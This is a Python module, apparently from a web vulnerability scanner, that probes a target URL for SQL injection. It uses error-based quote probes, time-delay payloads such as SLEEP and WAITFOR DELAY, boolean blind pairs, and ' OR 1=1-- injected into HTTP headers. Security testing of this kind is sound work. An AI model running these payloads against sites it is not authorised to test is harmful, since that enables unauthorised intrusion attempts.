# scanner/injection.py

import requests
import time

error_signatures = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "pg_query():",
    "syntax error"
]

time_payloads = [
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' || pg_sleep(5)--",
]

boolean_payloads = [
    ("1' AND 1=1--", True),
    ("1' AND 1=2--", False)
]

headers_to_inject = ["User-Agent", "Referer", "X-Forwarded-For"]

def scan(target_url):
    print("[*] Running A03: Injection Scan (Advanced)...")
    vulnerabilities = []

    # -----------------------------
    # 1. Parameter-based injection
    # -----------------------------
    try:
        print("[*] Testing query parameter injection...")
        test_params = ["id", "page", "user", "search"]
        for param in test_params:
            test_url = f"{target_url}?{param}=1'"
            res = requests.get(test_url, timeout=5)
            for error in error_signatures:
                if error in res.text.lower():
                    vulnerabilities.append(f"Error-based SQLi via parameter '{param}'")
    except:
        pass

    # -----------------------------
    # 2. Time-based Injection
    # -----------------------------
    try:
        print("[*] Testing time-based SQL injection...")
        for payload in time_payloads:
            start = time.time()
            res = requests.get(f"{target_url}?id={payload}", timeout=10)
            end = time.time()
            if end - start > 4:
                vulnerabilities.append("Time-based SQLi detected")
                break
    except:
        pass

    # -----------------------------
    # 3. Boolean-based Blind Injection
    # -----------------------------
    try:
        print("[*] Testing blind boolean-based SQL injection...")
        true_resp = requests.get(f"{target_url}?id={boolean_payloads[0][0]}")
        false_resp = requests.get(f"{target_url}?id={boolean_payloads[1][0]}")
        if true_resp.status_code == 200 and false_resp.status_code == 200 and true_resp.text != false_resp.text:
            vulnerabilities.append("Blind boolean-based SQLi detected")
    except:
        pass

    # -----------------------------
    # 4. Header Injection
    # -----------------------------
    try:
        print("[*] Testing header injection...")
        for header in headers_to_inject:
            res = requests.get(target_url, headers={header: "' OR 1=1--"}, timeout=5)
            for error in error_signatures:
                if error in res.text.lower():
                    vulnerabilities.append(f"SQLi via header '{header}'")
    except:
        pass

    return {
        'vulnerability': 'Injection (A03)',
        'found': bool(vulnerabilities),
        'details': vulnerabilities if vulnerabilities else "No injection vulnerabilities found."
    }
